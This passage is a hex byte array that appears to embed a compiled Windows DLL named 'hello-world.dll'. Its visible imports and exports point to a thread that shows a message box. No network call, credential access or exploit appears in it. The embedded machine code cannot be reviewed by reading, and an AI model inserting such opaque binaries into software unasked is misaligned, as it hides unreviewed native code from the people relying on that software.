	0x02, 0x50, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
	0x01, 0x0D, 0x04, 0x00, 0x0D, 0x34, 0x0A, 0x00, 0x0D, 0x72, 0x06, 0x50,
	0x01, 0x14, 0x08, 0x00, 0x14, 0x64, 0x08, 0x00, 0x14, 0x54, 0x07, 0x00,
	0x14, 0x34, 0x06, 0x00, 0x14, 0x32, 0x10, 0x70, 0x01, 0x0D, 0x04, 0x00,
	0x0D, 0x34, 0x09, 0x00, 0x0D, 0x32, 0x06, 0x50, 0x01, 0x15, 0x05, 0x00,
	0x15, 0x34, 0xBA, 0x00, 0x15, 0x01, 0xB8, 0x00, 0x06, 0x50, 0x00, 0x00,
	0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x07, 0x00, 0x0F, 0x34, 0x06, 0x00,
	0x0F, 0x32, 0x0B, 0x70, 0x01, 0x12, 0x06, 0x00, 0x12, 0x74, 0x08, 0x00,
	0x12, 0x34, 0x07, 0x00, 0x12, 0x32, 0x0B, 0x50, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x73, 0x7B, 0xA7, 0x5A, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0x27, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x02, 0x00, 0x00, 0x00, 0xF8, 0x26, 0x00, 0x00, 0x00, 0x27, 0x00, 0x00,
	0x08, 0x27, 0x00, 0x00, 0x30, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x1C, 0x27, 0x00, 0x00, 0x24, 0x27, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x2D, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x2E,
	0x64, 0x6C, 0x6C, 0x00, 0x44, 0x6C, 0x6C, 0x4D, 0x61, 0x69, 0x6E, 0x00,
	0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x54, 0x68,
	0x72, 0x65, 0x61, 0x64, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x27, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x28, 0x00, 0x00,
	0x00, 0x20, 0x00, 0x00, 0x20, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xD4, 0x28, 0x00, 0x00, 0x80, 0x20, 0x00, 0x00,
	0x30, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x22, 0x29, 0x00, 0x00, 0x90, 0x20, 0x00, 0x00, 0x50, 0x28, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x2A, 0x00, 0x00,
	0xB0, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5C, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x2B, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x2C, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x16, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2B, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE6, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCA, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB6, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xA2, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x84, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x54, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3A, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC6, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x18, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x28, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x9C, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x29, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xB8, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4E, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x29, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x34, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD4, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEC, 0x29, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFA, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE7, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
	0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x00, 0x4B, 0x45, 0x52, 0x4E,
	0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x4A, 0x02,
	0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00,
	0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
	0x08, 0x00, 0x5F, 0x5F, 0x43, 0x5F, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66,
	0x69, 0x63, 0x5F, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00,
	0x25, 0x00, 0x5F, 0x5F, 0x73, 0x74, 0x64, 0x5F, 0x74, 0x79, 0x70, 0x65,
	0x5F, 0x69, 0x6E, 0x66, 0x6F, 0x5F, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F,
	0x79, 0x5F, 0x6C, 0x69, 0x73, 0x74, 0x00, 0x00, 0x3E, 0x00, 0x6D, 0x65,
	0x6D, 0x73, 0x65, 0x74, 0x00, 0x00, 0x56, 0x43, 0x52, 0x55, 0x4E, 0x54,
	0x49, 0x4D, 0x45, 0x31, 0x34, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
	0x36, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72, 0x6D, 0x00,
	0x37, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72, 0x6D, 0x5F,
	0x65, 0x00, 0x3F, 0x00, 0x5F, 0x73, 0x65, 0x68, 0x5F, 0x66, 0x69, 0x6C,
	0x74, 0x65, 0x72, 0x5F, 0x64, 0x6C, 0x6C, 0x00, 0x18, 0x00, 0x5F, 0x63,
	0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x65, 0x5F, 0x6E, 0x61, 0x72,
	0x72, 0x6F, 0x77, 0x5F, 0x61, 0x72, 0x67, 0x76, 0x00, 0x00, 0x33, 0x00,
	0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F,
	0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72,
	0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x00, 0x00, 0x34, 0x00, 0x5F, 0x69,
	0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x6F, 0x6E,
	0x65, 0x78, 0x69, 0x74, 0x5F, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x00, 0x00,
	0x3C, 0x00, 0x5F, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x5F,
	0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x66, 0x75, 0x6E, 0x63, 0x74,
	0x69, 0x6F, 0x6E, 0x00, 0x22, 0x00, 0x5F, 0x65, 0x78, 0x65, 0x63, 0x75,
	0x74, 0x65, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x74, 0x61,
	0x62, 0x6C, 0x65, 0x00, 0x1E, 0x00, 0x5F, 0x63, 0x72, 0x74, 0x5F, 0x61,
	0x74, 0x65, 0x78, 0x69, 0x74, 0x00, 0x16, 0x00, 0x5F, 0x63, 0x65, 0x78,
	0x69, 0x74, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77,
	0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x72, 0x75, 0x6E, 0x74, 0x69,
	0x6D, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C,
	0x6C, 0x00, 0xAE, 0x04, 0x52, 0x74, 0x6C, 0x43, 0x61, 0x70, 0x74, 0x75,
	0x72, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0xB5, 0x04,
	0x52, 0x74, 0x6C, 0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x46, 0x75, 0x6E,
	0x63, 0x74, 0x69, 0x6F, 0x6E, 0x45, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x00,
	0xBC, 0x04, 0x52, 0x74, 0x6C, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C,
	0x55, 0x6E, 0x77, 0x69, 0x6E, 0x64, 0x00, 0x00, 0x92, 0x05, 0x55, 0x6E,
	0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70,
	0x74, 0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x00,
	0x52, 0x05, 0x53, 0x65, 0x74, 0x55, 0x6E, 0x68, 0x61, 0x6E, 0x64, 0x6C,
	0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x46,
	0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x0F, 0x02, 0x47, 0x65, 0x74, 0x43,
	0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
	0x73, 0x00, 0x70, 0x05, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74,
	0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x70, 0x03,
	0x49, 0x73, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x46,
	0x65, 0x61, 0x74, 0x75, 0x72, 0x65, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6E,
	0x74, 0x00, 0x30, 0x04, 0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72,
	0x66, 0x6F, 0x72, 0x6D, 0x61, 0x6E, 0x63, 0x65, 0x43, 0x6F, 0x75, 0x6E,
	0x74, 0x65, 0x72, 0x00, 0x10, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72,
	0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49,
	0x64, 0x00, 0x14, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65,
	0x6E, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x00, 0x00,
	0xDD, 0x02, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x54,
	0x69, 0x6D, 0x65, 0x41, 0x73, 0x46, 0x69, 0x6C, 0x65, 0x54, 0x69, 0x6D,
	0x65, 0x00, 0x54, 0x03, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69,
	0x7A, 0x65, 0x53, 0x4C, 0x69, 0x73, 0x74, 0x48, 0x65, 0x61, 0x64, 0x00,
	0x6A, 0x03, 0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72,
	0x50, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0xA2, 0xDF, 0x2D,
	0x99, 0x2B, 0x00, 0x00, 0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF,
	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x02, 0x00, 0x00, 0x00, 0x2F, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x24, 0x10, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x30, 0x10, 0x00, 0x00, 0x62, 0x10, 0x00, 0x00,
	0x88, 0x25, 0x00, 0x00, 0x80, 0x10, 0x00, 0x00, 0xA1, 0x10, 0x00, 0x00,
	0x90, 0x25, 0x00, 0x00, 0xA4, 0x10, 0x00, 0x00, 0xF4, 0x10, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0xF4, 0x10, 0x00, 0x00, 0x1F, 0x12, 0x00, 0x00,
	0x94, 0x25, 0x00, 0x00, 0x20, 0x12, 0x00, 0x00, 0xA2, 0x12, 0x00, 0x00,
	0xC8, 0x25, 0x00, 0x00, 0xA4, 0x12, 0x00, 0x00, 0x99, 0x13, 0x00, 0x00,
	0xF0, 0x25, 0x00, 0x00, 0x9C, 0x13, 0x00, 0x00, 0xF0, 0x13, 0x00, 0x00,
	0x70, 0x26, 0x00, 0x00, 0xF0, 0x13, 0x00, 0x00, 0x2D, 0x14, 0x00, 0x00,
	0xA0, 0x26, 0x00, 0x00, 0x30, 0x14, 0x00, 0x00, 0x64, 0x14, 0x00, 0x00,
	0x5C, 0x26, 0x00, 0x00, 0x64, 0x14, 0x00, 0x00, 0x35, 0x15, 0x00, 0x00,
	0x20, 0x26, 0x00, 0x00, 0x38, 0x15, 0x00, 0x00, 0xA9, 0x15, 0x00, 0x00,
	0x28, 0x26, 0x00, 0x00, 0xAC, 0x15, 0x00, 0x00, 0xE5, 0x15, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0xE8, 0x15, 0x00, 0x00, 0x1C, 0x16, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x1C, 0x16, 0x00, 0x00, 0x31, 0x16, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x34, 0x16, 0x00, 0x00, 0x5C, 0x16, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x5C, 0x16, 0x00, 0x00, 0x71, 0x16, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x74, 0x16, 0x00, 0x00, 0xD5, 0x16, 0x00, 0x00,
	0x70, 0x26, 0x00, 0x00, 0xD8, 0x16, 0x00, 0x00, 0x08, 0x17, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x08, 0x17, 0x00, 0x00, 0x1C, 0x17, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x1C, 0x17, 0x00, 0x00, 0x65, 0x17, 0x00, 0x00,
	0x5C, 0x26, 0x00, 0x00, 0x68, 0x17, 0x00, 0x00, 0x31, 0x18, 0x00, 0x00,
	0x64, 0x26, 0x00, 0x00, 0x34, 0x18, 0x00, 0x00, 0xCD, 0x18, 0x00, 0x00,
	0x34, 0x26, 0x00, 0x00, 0xD0, 0x18, 0x00, 0x00, 0xF4, 0x18, 0x00, 0x00,
	0x5C, 0x26, 0x00, 0x00, 0xF4, 0x18, 0x00, 0x00, 0x1F, 0x19, 0x00, 0x00,
	0x5C, 0x26, 0x00, 0x00, 0x20, 0x19, 0x00, 0x00, 0x6F, 0x19, 0x00, 0x00,
	0x5C, 0x26, 0x00, 0x00, 0x70, 0x19, 0x00, 0x00, 0x87, 0x19, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x88, 0x19, 0x00, 0x00, 0x34, 0x1A, 0x00, 0x00,
	0x84, 0x26, 0x00, 0x00, 0x60, 0x1A, 0x00, 0x00, 0x7B, 0x1A, 0x00, 0x00,
	0x80, 0x25, 0x00, 0x00, 0x84, 0x1A, 0x00, 0x00, 0xC9, 0x1B, 0x00, 0x00,
	0x90, 0x26, 0x00, 0x00, 0xCC, 0x1B, 0x00, 0x00, 0x16, 0x1C, 0x00, 0x00,
	0xA0, 0x26, 0x00, 0x00, 0x18, 0x1C, 0x00, 0x00, 0x62, 0x1C, 0x00, 0x00,
	0xA0, 0x26, 0x00, 0x00, 0x6C, 0x1C, 0x00, 0x00, 0x32, 0x1E, 0x00, 0x00,
	0xB0, 0x26, 0x00, 0x00, 0xC0, 0x1E, 0x00, 0x00, 0xC2, 0x1E, 0x00, 0x00,
	0xC0, 0x26, 0x00, 0x00, 0xC2, 0x1E, 0x00, 0x00, 0xD9, 0x1E, 0x00, 0x00,
	0xC0, 0x25, 0x00, 0x00, 0xD9, 0x1E, 0x00, 0x00, 0xF5, 0x1E, 0x00, 0x00,
	0xC0, 0x25, 0x00, 0x00, 0xF5, 0x1E, 0x00, 0x00, 0x2B, 0x1F, 0x00, 0x00,
	0x18, 0x26, 0x00, 0x00, 0x2B, 0x1F, 0x00, 0x00, 0x43, 0x1F, 0x00, 0x00,
	0x54, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x36, 0x00, 0x00, 0x00, 0x47, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00,
	0x0B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
